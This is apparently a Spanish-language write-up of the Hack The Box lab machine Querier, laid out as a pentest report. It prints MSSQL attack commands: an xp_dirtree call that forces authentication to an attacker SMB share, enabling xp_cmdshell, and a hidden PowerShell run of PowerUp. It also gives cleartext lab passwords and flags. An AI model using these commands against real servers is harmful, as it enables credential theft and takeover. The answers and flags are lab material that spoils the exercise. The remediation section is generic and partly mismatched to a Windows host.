---
title: "Informe Técnico: Querier (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Querier de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Querier

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Querier** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Querier |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**What non-administrative share is available on Querier over SMB?**

R:  reports

![Captura de pantalla 2025-08-28 114629.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_01.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_02.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_03.png)

**What is the password for the reporting user on the Querier database?**

R: PcwTWTHRwryjc$c6”

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_04.png)

![Captura de pantalla 2025-08-28 115857.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_05.png)

**What user is the MSSQL server running as?**

 

R:   mssql-svc

```jsx
impacket-mssqlclient -windows-auth 'QUERIER/reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -port 1433 -db volume
EXEC master..xp_dirtree '\\10.10.14.8\share';
impacket-smbserver -smb2support shared $(pwd)

```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_06.png)

**What is the mssql-svc user's password?**

R: corporate568

![Captura de pantalla 2025-08-28 124215.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_07.png)

**Is the mssql-svc a server admin on Querier's MSSQL instance?**

R: yes

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_08.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_09.png)

```jsx
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

**Submit the flag located on the mssql-svc user's desktop.**

R: a156b32e6a225cc9c25f5c34211410c3

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_10.png)

**What is the full path of the Group Policy Preference file on Querier?**

R: C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml

```jsx
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;          RECONFIGURE;
EXEC xp_cmdshell 'powershell -NoP -W Hidden -EP Bypass -Command ". ''C:\Users\mssql-svc\Desktop\PowerUp.ps1''; Invoke-AllChecks -Verbose | Tee-Object C:\Users\mssql-svc\Desktop\powerup.txt"';
 EXEC xp_cmdshell 'dir /b "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"';

```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_11.png)

**What is the administrator user's password?**

R: MyUnclesAreMarioAndLuigi!!1!

**Submit the flag located on the administrator user's desktop.**

R: e58217783e0bfc2049fa8d30ccbb27a1

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/querier/images/step_12.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
